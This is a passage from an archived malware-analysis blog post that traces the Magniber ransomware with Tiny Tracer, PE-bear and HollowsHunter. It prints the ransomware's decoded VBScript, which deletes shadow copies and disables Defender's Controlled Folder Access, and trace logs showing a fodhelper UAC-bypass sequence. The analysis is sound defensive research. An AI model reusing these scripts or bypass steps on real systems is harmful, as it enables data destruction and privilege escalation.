{
    "id": "7fb88639-25f3-4e8d-aaa1-8223aea6257c",
    "created_at": "2023-05-06T02:08:17.874153Z",
    "updated_at": "2025-03-27T02:08:33.32739Z",
    "deleted_at": null,
    "sha1_hash": "88f65bf45336a5b37b3920016033cf891bc7129e",
    "title": "2023-03-30 - Magniber ransomware analysis- Tiny Tracer in action",
    "authors": "",
    "file_creation_date": "2023-05-05T02:08:23Z",
    "file_modification_date": "2023-05-05T02:08:23Z",
    "file_size": 1952700,
    "plain_text": "# Magniber ransomware analysis: Tiny Tracer in action\n\n**[hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/](https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/)**\n\nView all posts by hasherezade → March 30, 2023\n\n## Intro\n\nMagniber is a ransomware that was initially targeting South Korea. My first report on this\n[malware was written for Malwarebytes in 2017 (here).](https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans)\n\nSince then, the ransomware was completely rewritten, and turned into a much more complex\nbeast. The articles showing the timeline of the evolution of Magniber ransomware are available\nhere: [Magniber at Malpedia. In this writeup we will have a deep dive in a one of the samples](https://malpedia.caad.fkie.fraunhofer.de/details/win.magniber)\nfrom the updated edition.\n\n**Note that the sample described here is not new: it has been discovered in 2022 and**\nanalyzed by various researchers. Due to the fact that this malware uses raw syscalls, I decided\n[that it is a good example to showcase the new version of Tiny Tracer (v2.3), allowing to trace](https://github.com/hasherezade/tiny_tracer/releases)\nsyscalls. However, this writeup is not limited to a short demo, but shows the analysis process\nstep by step, from the beginning. Tiny Tracer will help us easily reach the hidden core of this\nobfuscated ransomware: the code directly responsible for the files encryption process.\n\n## Analyzed sample\n\n Behavioral analysis\n\nWhen executed, this rasomware runs silently, encrypting files with selected extensions, and\nappending its own extension at the end. In case of the currently analyzed sample, the added\nextention is ‘vieijibfm‘. In each directory with encrypted files, we can also find a ransom note:\n```\nREADME.html.\n\n```\n[Visualization of an encrypted BMP file – before and after (created with the help of file2png.py):](https://github.com/hasherezade/crypto_utils/blob/master/file2png.py)\n\n\n-----\n\nBefore the encryption\n\nAfter the encryption by Magniber\n\nThe entropy of the encrypted file is high, and there are no patterns visible. This may suggest that\nsome strong encryption was used, possibly AES with block chaining (CBC mode).\n\nIt drops, runs and then deletes a VBS script in C:\\Users\\Public, under a random name:\n\nWe can also find there two files with pseudorandom names, that are used as mutexes, to\nindidate that the encryption is running, or completed. At the end, the PNG file is dropped in the\nsame directory:\n\n\n-----\n\nAfter a while, the wallpaper gets changed to the dropped PNG, announcing the attack:\n\n\n-----\n\nThe information printed at the wallpaper mentions the ransom note README.html where the\nvictim can find more information.\n\nThe content of the README.html has the following form:\n\nIt mentions further a Tor website, that can be used to make the contact with the attacker, and\npossibly buy the key for files decryption. At the time of this analysis, the website was not\navailable.\n\nWhile the extension added to the encrypted files didn’t change, and also occurs in the note, the\nused number at the beginning of the address is generated per attack.\n\nNote that the ransom note is almost identical as the note used by the old Magniber’s version\nfrom 2017:\n\n\n-----\n\n_Above: ransom note from the old Magniber’s edition (from 2017), full analysis at:_\n_https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-_\n_koreans_\n\n## Inside\n\n### Upacking the MSI\n\nMagniber sample comes packed in the MSI (Microsoft Installer). We can view the scripts inside\nwith Microsoft’s tool, Orca MSI (mirror: [here).](https://www.technipages.com/download-orca-msi-editor)\n\n\n-----\n\nBy looking at the Custom Action we find out that the binary to be run is named utskzc, and\nthe function that will be executed from there is “mvrtubhpxy”. In order to access that binary we\nneed to unpack the content of the MSI package. We can do it with the help of 7zip.\n\nThen we find out that the aforementioned binary is a PE file, and it exports the function\n“mvrtubhpxy”.\n\nThis is where the execution of the binary starts.\n\n### Overview of Magniber’s DLL\n\nIf we try to open this binary in IDA, we can clearly see that this binary is obfuscated. The\nexecution starts from a single call…\n\n\n-----\n\n…that leads into a “rabbithole” of jumps…\n\n\n-----\n\nHow can we analyze the ransomware inner workings, when it is so hard to even find the relevant\ncode? It isn’t as hard as it seems if we involve DBI (Dynamic Binary Instrumentation) tools, such\n[as Pin-based Tiny Tracer.](https://github.com/hasherezade/tiny_tracer)\n\n### Tracing the first stage executable\n\n[Let’s dive into the sample by tracing it with Tiny Tracer (you can find the installation instructions](https://github.com/hasherezade/tiny_tracer)\n[here). To makes things easier, I converted the DLL into EXE (as described here), changing its](https://github.com/hasherezade/tiny_tracer/wiki/Installation)\nentry point to the exported function (since the DllMain does not do much in this case, and the\nexported function takes no parameters, we should be able to simply redirect it).\n\nHowever, on the attempt of tracing it, I’ve got an unpleasant surprise. The Pin Tracer terminated\nwith an error:\n\n\n-----\n\n```\nPin: pin 3.25 98650 8f6168173\n\nCopyright 2002-2022 Intel Corporation.\n\nE: UPC Dispatcher: Unhandled internal exception in Pin or tool. ThreadId = 0 SysThreadId\n= 3348. Interruption context: IP: 0x0725c6ad0 SP: 0x001b0e290. Exception Code:\nRECEIVED_ACCESS_FAULT. Exception Address = 0x0725c6ad0. Access Type: READ. Access Address\n= 0x2792246e3. ExceptionFlags: 0x000000000\n\n```\nIt is not very intuitive to guess what caused such error. Fortunately, from the previous experience\nI know what it could be: some corruptions in the PE format itself. By looking at the Magniber\n[executable in PE-bear, I found the suspected cause – malformed data directories:](https://hshrzd.wordpress.com/pe-bear/)\n\nI cleaned it up, by removing the invalid entries:\n\n\n-----\n\nThen made another attempt. This time the tracing continues cleanly.\n\nThis is the fragment of the tracelog made with default Tiny Tracer’s settings:\n```\nf069;section: [.swicc]\n\n10c4;called: ?? [13240000+0]\n\n> 13240000+20;called: ?? [1324d000+53d]\n\n> 13240000+55;called: ?? [13270000+0]\n\n> 13240000+ca;called: ?? [13270000+0]\n\n> 13240000+229;called: ?? [13330000+0]\n\n> 13240000+272;called: ?? [13370000+0]\n\n> 13240000+229;called: ?? [13390000+0]\n\n> 13240000+272;called: ?? [133d0000+0]\n\n```\nIt doesn’t give us much information, apart from the fact that the execution quickly switched to\nsome newly allocated block of code (probably a shellcode or a section unpacked in memory). To\nget more details, make sure that following settings are set in TinyTracer.ini:\n```\nFOLLOW_SHELLCODES=3\n\nTRACE_SYSCALL=True\n\n```\nThis time we can see something more interesting – it turns out the malware uses raw syscalls!\n\n\n-----\n\n```\nf069;section: [.swicc]\n\nef24;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n10c4;called: ?? [14bd0000+0]\n\n> 14bd0000+20;called: ?? [14bdd000+53d]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14bd0000+55;called: ?? [14be0000+0]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14bd0000+ca;called: ?? [14be0000+0]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14bd0000+229;called: ?? [14c90000+0]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14bd0000+272;called: ?? [14cd0000+0]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14bd0000+229;called: ?? [14cf0000+0]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n[...]\n\n```\nAt this point we can already read from the tracelog where the “rabbit hole” ends. The new\nmemory is allocated (using the syscall), the content of shellcode is copied there, and executed.\nThe execution is redirected to the shellcode at the RVA = 0x10c4 in the Magniber’s executable.\nWe can set the breakpoint at this offset in a debugger, and dump this shellcode for further\nanalysis (it is [shellcode#1).](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)\n\nBut for now, let’s continue with the tracing of the main executable, and see what we can learn\nfrom it…\n\nThere are some back-and-forth calls between the different pieces of a shellcode, so, in order to\navoid the noise, I am gonna filter it out by changing yet another option in TinyTracer.ini:\n```\nLOG_SHELLCODES_TRANSITIONS=False\n\n```\nAnd we can try tracing it again. This is what I got this time:\n\n\n-----\n\n```\nf069;section: [.swicc]\n\nef24;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n10c4;called: ?? [14bd0000+0]\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14be0000+8;SYSCALL:0x36(NtQuerySystemInformation)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14be0000+8;SYSCALL:0x36(NtQuerySystemInformation)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14c90000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14cd0000+8;SYSCALL:0x26(NtOpenProcess)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14cf0000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14d30000+8;SYSCALL:0x26(NtOpenProcess)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14d70000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14d80000+8;SYSCALL:0x26(NtOpenProcess)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14d90000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14da0000+8;SYSCALL:0x26(NtOpenProcess)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n[...]\n\n> 170f7000+6cb;SYSCALL:0x8(NtWriteFile)\n\n> 170f7000+6b5;SYSCALL:0xf(NtClose)\n\n> 170f7000+6aa;SYSCALL:0x34(NtDelayExecution)\n\n> 170f2000+cc3;ntdll.RtlCreateProcessParametersEx\n\n> 170f7000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 170f7000+841;SYSCALL:0xc8(NtCreateUserProcess)\n\n```\n[Complete tracelog available here: magni.tag](https://gist.github.com/hasherezade/aa969e7c431023afabffef9f881616c2)\n\nAt the end PIN dumped pin.log file informing about an error:\n```\nPin: pin-3.26-98690-1fc9d60e6\n\nCopyright 2002-2022 Intel Corporation.\n\nA: C:\\tmp_proj\\pinjen\\workspace\\pypl-pinnightly\\GitPin\\Source\\pin\\vm_w\\follow_child_windows.cpp:\nLEVEL_VM::WIN_FOLLOW_CHILD::NotifyAfterCreateUserProcess: 129: assertion failed:\nsuspended\n\n```\nThis time the error informs that the traced process created a child, which Tiny Tracer failed to\nfollow (indeed we can see in the log file the last called function is NtCreateUserProcess). This\nsituation is normal.\n\nAs we can see, the majority of the logged functions are called by syscalls. There are just a few\nfunctions here and there that are called directly from a DLL, such as\n```\nRtlCreateProcessParametersEx, RtlInitUnicodeString.\n\n```\n\n-----\n\nThe next thing that we can do in order to get more information about what is going on, is to\ndump arguments of the functions. This can be easily done with Tiny Tracer, by editing\n**_[params.txt list (more info on project Wiki). Since Tiny Tracer v2.3 we can also log syscalls](https://github.com/hasherezade/tiny_tracer/wiki/Tracing-parameters-of-functions)_**\narguments. In this case, we will log the syscalls arguments referencing them by the\ncorresponding functions from NTDLL.\n\n[I prepared a list relevant for the above tracelog (gist: params.txt):](https://gist.github.com/hasherezade/19aee3fedb8f1c0b62c4f62cddf752eb)\n```\nntdll;RtlCreateProcessParametersEx;10\n\nntdll;RtlInitUnicodeString;2\n\nntdll;NtAllocateVirtualMemory;6\n\nntdll;NtQuerySystemInformation;4\n\nntdll;NtOpenProcess;4\n\nntdll;NtWriteVirtualMemory;5\n\nntdll;NtCreateThreadEx;11\n\nntdll;NtResumeThread;2\n\nntdll;NtQueryPerformanceCounter;2\n\nntdll;NtOpenFile;6\n\nntdll;NtQueryVolumeInformationFile;5\n\nntdll;NtOpenKey;3\n\nntdll;NtEnumerateKey;6\n\nntdll;NtWriteFile;9\n\nntdll;NtSetValueKey;6\n\nntdll;NtCreateUserProcess;10\n\nntdll;NtCreateFile;10\n\n```\nI traced it again, with the changed settings. This time tracelog revealed the strings that were\nreferenced by this functions. Fragment:\n\n\n-----\n\n```\n[...]\n\n> 17353000+df9;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"\\Registry\\User\\\"\n\n     Arg[1] = ptr 0x0000000017c80000 -> L\"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv\"\n> 17357000+6f7;SYSCALL:0x12(NtOpenKey)\n\nNtOpenKey:\n\n     Arg[0] = ptr 0x00000000174bf8f0 -> {\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff}\n\n     Arg[1] = ptr 0x00000000000f003f -> {\\x00@.\\x9a\\x02\\x00\\x00\\x00}\n\n     Arg[2] = ptr 0x00000000174bf910 -> L\"0\"\n\n> 17353000+e4e;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv\"\n\n     Arg[1] = ptr 0x00000000174bf9c0 -> L\"Shell\"\n> 17357000+6f7;SYSCALL:0x12(NtOpenKey)\n\nNtOpenKey:\n\n     Arg[0] = ptr 0x00000000174bf8f0 -> {\\x04\\x02\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = ptr 0x00000000000f003f -> {\\x00@.\\x9a\\x02\\x00\\x00\\x00}\n\n     Arg[2] = ptr 0x00000000174bf910 -> L\"0\"\n\n> 17353000+ea2;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"Shell\"\n\n     Arg[1] = ptr 0x00000000174bf9b0 -> L\"Open\"\n> 17357000+6f7;SYSCALL:0x12(NtOpenKey)\n\nNtOpenKey:\n\n     Arg[0] = ptr 0x00000000174bf8f0 -> {\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = ptr 0x00000000000f003f -> {\\x00@.\\x9a\\x02\\x00\\x00\\x00}\n\n     Arg[2] = ptr 0x00000000174bf910 -> L\"0\"\n\n> 17353000+ef6;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"Open\"\n\n     Arg[1] = ptr 0x00000000174bf9e0 -> L\"command\"\n> 17357000+6f7;SYSCALL:0x12(NtOpenKey)\n\nNtOpenKey:\n\n     Arg[0] = ptr 0x00000000174bf8f0 -> {\\x0c\\x02\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = ptr 0x00000000000f003f -> {\\x00@.\\x9a\\x02\\x00\\x00\\x00}\n\n     Arg[2] = ptr 0x00000000174bf910 -> L\"0\"\n\n> 17353000+f49;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"command\"\n     Arg[1] = ptr 0x00000000174bfaf0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n> 17357000+70d;SYSCALL:0x60(NtSetValueKey)\n\nNtSetValueKey:\n\n     Arg[0] = 0x0000000000000210 = 528\n\n     Arg[1] = ptr 0x00000000174bf900 -> {\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00}\n\n```\n\n-----\n\n```\n     Arg[2] 0\n\n     Arg[3] = 0x0000000000000001 = 1\n\n     Arg[4] = ptr 0x0000000017bd0000 -> L\"wscript.exe /B /E:VBScript.Encode\n../../Users/Public/vybmaryqycp.mnxu\"\n     Arg[5] = 0x000000000000008a = 138\n\n> 17353000+f86;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> {\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = ptr 0x00000000174bfa28 -> L\"DelegateExecute\"\n> 17357000+70d;SYSCALL:0x60(NtSetValueKey)\n\nNtSetValueKey:\n\n     Arg[0] = 0x0000000000000210 = 528\n\n     Arg[1] = ptr 0x00000000174bf900 -> U\"DelegateExecute\"\n     Arg[2] = 0\n\n     Arg[3] = 0x0000000000000001 = 1\n\n     Arg[4] = ptr 0x00000000174bfaf0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[5] = 0x0000000000000004 = 4\n\n> 17357000+6b5;SYSCALL:0xf(NtClose)\n\n> 17357000+689;SYSCALL:0x1e(NtFreeVirtualMemory)\n\n> 17354000+1b;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"DelegateExecute\"\n\n     Arg[1] = ptr 0x00000000174bf9f0 -> L\"ms-settings\"\n> 17357000+718;SYSCALL:0x1d(NtCreateKey)\n\n> 17354000+87;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"ms-settings\"\n\n     Arg[1] = ptr 0x00000000174bf9d0 -> L\"CurVer\"\n> 17357000+718;SYSCALL:0x1d(NtCreateKey)\n\n> 17354000+f4;ntdll.RtlInitUnicodeString\n\nRtlInitUnicodeString:\n\n     Arg[0] = ptr 0x00000000174bf900 -> U\"CurVer\"\n\n     Arg[1] = ptr 0x00000000174bfaf0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n> 17357000+70d;SYSCALL:0x60(NtSetValueKey)\n\nNtSetValueKey:\n\n     Arg[0] = 0x0000000000000214 = 532\n\n     Arg[1] = ptr 0x00000000174bf900 -> {\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = 0x0000000000000001 = 1\n\n     Arg[4] = ptr 0x0000000017c80000 -> L\"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv\"\n\n     Arg[5] = 0x0000000000000048 = 72\n\n> 17357000+6b5;SYSCALL:0xf(NtClose)\n\n> 17357000+6b5;SYSCALL:0xf(NtClose)\n\n> 17357000+6aa;SYSCALL:0x34(NtDelayExecution)\n\n> 17357000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\nNtAllocateVirtualMemory:\n\n     Arg[0] = 0xffffffffffffffff = 18446744073709551615\n\n```\n\n-----\n\n```\n     Arg[1] ptr 0x00000000174bf8c0  {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = ptr 0x00000000174bf8c8 -> L\"J\"\n\n     Arg[4] = 0x0df06fa200001000 = 1004425458479009792\n\n     Arg[5] = 0x3548001a00000004 = 3839318794002497540\n\n> 17357000+6c0;SYSCALL:0x55(NtCreateFile)\n\nNtCreateFile:\n\n     Arg[0] = ptr 0x00000000174bf8b0 -> {\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff}\n\n     Arg[1] = ptr 0x0000000000120116 -> {\\x00\\x00\\xf0*\\x9a\\x02\\x00\\x00}\n\n     Arg[2] = ptr 0x00000000174bf840 -> L\"0\"\n\n     Arg[3] = ptr 0x00000000174bf830 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0\n\n     Arg[5] = 0x3548001a00000080 = 3839318794002497664\n\n     Arg[6] = 0x7a20201200000002 = 8800068933563449346\n\n     Arg[7] = 0x3478478a00000005 = 3780850545208590341\n\n     Arg[8] = 0x3c506e8200000020 = 4346095145037332512\n\n     Arg[9] = 0\n\n> 17357000+6cb;SYSCALL:0x8(NtWriteFile)\n\nNtWriteFile:\n\n     Arg[0] = 0x0000000000000200 = 512\n\n     Arg[1] = 0\n\n     Arg[2] = 0\n\n     Arg[3] = 0\n\n     Arg[4] = ptr 0x00000000174bf810 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[5] = ptr 0x000000001735cdbf -> {#@~^YQIA}\n     Arg[6] = 0x7a2020120000027c = 8800068933563449980\n\n     Arg[7] = 0\n\n     Arg[8] = 0\n\n> 17357000+6b5;SYSCALL:0xf(NtClose)\n\n> 17357000+6aa;SYSCALL:0x34(NtDelayExecution)\n\n> 17352000+cc3;ntdll.RtlCreateProcessParametersEx\n\nRtlCreateProcessParametersEx:\n\n     Arg[0] = ptr 0x00000000174bf8b0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = ptr 0x00000000174bf7f0 -> U\"\\??\\C:\\Windows\\System32\\cmd.exe\"\n\n     Arg[2] = 0\n\n     Arg[3] = 0\n\n     Arg[4] = ptr 0x00000000174bf800 -> U\"/c fodhelper.exe\"\n     Arg[5] = 0\n\n     Arg[6] = 0\n\n     Arg[7] = 0\n\n     Arg[8] = 0\n\n     Arg[9] = 0\n\n> 17357000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\nNtAllocateVirtualMemory:\n\n     Arg[0] = 0xffffffffffffffff = 18446744073709551615\n\n     Arg[1] = ptr 0x00000000174bf8c0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = ptr 0x00000000174bf8b8 -> L\" \"\n\n     Arg[4] = 0x0000000000001000 = 4096\n\n     Arg[5] = 0x0000000000000004 = 4\n\n```\n\n-----\n\n```\n> 17357000+841;SYSCALL:0xc8(NtCreateUserProcess)\nNtCreateUserProcess:\n\n     Arg[0] = ptr 0x00000000174bf810 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = ptr 0x00000000174bf8c8 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0x00000000001fffff = 2097151\n\n     Arg[3] = 0x00000000001fffff = 2097151\n\n     Arg[4] = 0\n\n     Arg[5] = 0\n\n     Arg[6] = 0\n\n     Arg[7] = 0\n\n     Arg[8] = ptr 0x000000000046a610 -> {\\xc8\\x06\\x00\\x00\\xc8\\x06\\x00\\x00}\n\n     Arg[9] = ptr 0x00000000174bf820 -> L\"X\"\n\n```\n_[Complete log available here: magni.exe.tag.](https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5)_\n\nAs we can see, at the end the application executed “fodhelper.exe”. Googling for the related\n[strings lead us to the following PoC: FodhelperBypass.ps1. As we can see, this system](https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1)\napplication was used in one of the technique of UAC (User Account Bypass), meant to elevate\nprivileges on Windows. Comparing the strings used by the malware with the ones used in the\nPoC, as well as their order, and the context of usage, we can find a big overlap that allows to\nguess that this indeed was a UAC technique used by Magniber.\n\nThen we reach the aforementioned point where the Tiny Tracer is not able to follow the child\nprocess, so the execution terminates. At first, I thought to get more luck by running Magniber\ndirectly as an Administrator, so that it will skip the process creation, that is a part of its UAC\ntechnique. Unfortunately, the UAC is executed regardless the malware is deployed elevated or\nnot. For now we will just continue the analysis with what we have.\n\n### The VBE script\n\nWe can see in the log a line referencing a VBScript:\n```\nL\"wscript.exe /B /E:VBScript.Encode ../../Users/Public/vybmaryqycp.mnxu\"\n\n```\nIndeed this script is dropped (under a pseudo-random name) into C:/Users/Public.\n\nThis script is in an encrypted form (VBE), but it can be deobfuscated easily using public tools,\ni.e. [this one. The resulting content:](https://master.ayra.ch/vbs/vbs.aspx)\n\nOn Error Resume Next\n\nSet dd4y336wf97z = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")\n\nSet s1o28iq = dd4y336wf97z.ExecQuery(\"Select * From Win32_ShadowCopy\")\n\nFor Each d18706x in s1o28iq\n\nd18706x.Delete_\n\n\n-----\n\nNext\n\nSet c6406r7uh = GetObject(\"winmgmts:\n{impersonationLevel=impersonate}!\\\\.\\root\\Microsoft\\Windows\\Defender:MSFT_MpPreference\")\n\nSet jlfze3cy1qjq = c6406r7uh.Methods_(\"Set\").inParameters.SpawnInstance_()\n\njlfze3cy1qjq.Properties_.Item(\"EnableControlledFolderAccess\") = 0\n\nSet ub7mu3 = c6406r7uh.ExecMethod_(\"Set\", jlfze3cy1qjq)\n\nWScript.Quit Err.Number\n\n[view raw](https://gist.github.com/hasherezade/c93834738a12b1daaa1c06bdb3ea00f2/raw/41b26618a56bf166aacda910fd6e9e1841d00f18/magni_decoded.vbs) [magni_decoded.vbs\nhosted with ❤ by](https://gist.github.com/hasherezade/c93834738a12b1daaa1c06bdb3ea00f2#file-magni_decoded-vbs) [GitHub](https://github.com/)\nAs we can see, the script is responsible for deleting shadow copies. It also try to change the\nsystem settings, in order to expand what files it can access.\n\nAfter being run, the script is deleted.\n\n### Revealing the second stage shellcode\n\nThe inital sample has been terminated, but nevertheless, looking at the symptoms, we can\nconclude that the ransomware continued its execution: any newly created files with particular\nextensions keep getting encrypted. Probably the modules got injected into other processes. This\nobservation can be confirmed by looking at the tracelog:\n\n\n-----\n\n```\n[...]\n\n> 15460000+8;SYSCALL:0x26(NtOpenProcess)\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n> 15470000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 15490000+8;SYSCALL:0x19(NtQueryInformationProcess)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 154a0000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 154b0000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 154c0000+8;SYSCALL:0x3a(NtWriteVirtualMemory)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 154d0000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 154e0000+8;SYSCALL:0x50(NtProtectVirtualMemory)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 154f0000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 15500000+8;SYSCALL:0xc1(NtCreateThreadEx)\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 15510000+8;SYSCALL:0x34(NtDelayExecution)\n\n> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n> 15530000+8;SYSCALL:0x52(NtResumeThread)\n[...]\n\n```\nAs we can see in the log, the malware was looping over processes, writing to some of them, and\nexecuting the written content in a new thread.\n\nIn order to reveal where the implanted modules are located, I scanned the system with\n[HollowsHunter (as an Administrator), with a parameter /shellc – to dump all the shellcodes. It](https://github.com/hasherezade/hollows_hunter)\nturned out that there are multiple processes infected with the same piece of a shellcode.\nExample:\n\n\n-----\n\nLooking at the shellcode strings, we can see that it has a PNG embedded (that is probably the\nused wallpaper), and as well some HTML and JavaScript:\n\n\n-----\n\nThe same content of obfuscated JavaScript can be found in Magniber’s README:\n\n[By dumping all the strings from the shellcode, with the help of FLOSS, we can see some more](https://github.com/mandiant/flare-floss)\nthings hinting that this shellcode belongs to our ransomware:\n\n\n-----\n\n```\n[...]\n\nFLOSS static Unicode strings\n\n\\??\\\n\n0123456789abcdef\n\nf0123456789\n\nvieijibfm\n\nmstrxoorvdmynkde\n\ndocuments and settings\n\nappdata\n\nlocal settings\n\nsample music\n\nsample pictures\n\nsample videos\n\ntor browser\n\nrecycle\n\nwindows\n\nboot\n\nintel\n\nmsocache\n\nperflogs\n\nprogram files\n\nprogramdata\n\nrecovery\n\nsystem volume information\n\nwinnt\nREADME.html\n\nUsers\\Public\\\n\nwscript.exe /B /E:VBScript.Encode ../../Users/Public/\n\n.mnxu\n\n```\nFor example, there is a list of well known directories. Such lists are often used by ransomware to\nskip particular system directories. There are also strings related to the dropped VBE script, and\nthe hardcoded ransomware extension: vieijibfm.\n\nOverall, we can confirm with a high level of a confidence that the captured shellcode belongs to\nMagniber.\n\nWe can [run HollowsHunter with option /kill in order to kill all the infected and suspicious](https://github.com/hasherezade/hollows_hunter/wiki#killing-or-suspending-detected-processes)\nprocesses. To confirm that the ransomware is no longer active in the system, we can make\nanother experiment with creating a new file with one of the attacked extensions. This time the\nnew file won’t get encrypted – meaning all the processes containing Magniber are killed.\n\n## The second stage – Magniber’s core\n\n[3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a – the shellcode#2](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)\n\nWe can make an educated guess that the dumped shellcode is the unpacked Magniber’s core.\nSo, we will continue our tracing from this point.\n\n\n-----\n\nIn order to trace a shellcode, I have to wrap it as an executable. Similarly to the first stage, the\nshellcode is 64bit.\n\nThere are various ways to make a PE out of a shellcode. I decided to simply add it as a new\nsection to the first stage executable, and then redirect the Entry Point there:\n\n_Adding the section with the dumped shellcode (using PE-bear)_\n\n_Redirection of Entry Point to the newly added shellcode_\n\n\n-----\n\nFirst, I tested if the file executes properly, just by running it as a standalone on my VM.\nEverything works as expected: files got encrypted, and the wallpaper changes. So, that indeed it\nis the main part of the ransomware, responsible for encryption of the files.\n\nThen I rolled back the VM, and run it once again – this time via TinyTracer. It turned out to work\nwell. However, the tracing again breaks on the new process creation (used for UAC). It is 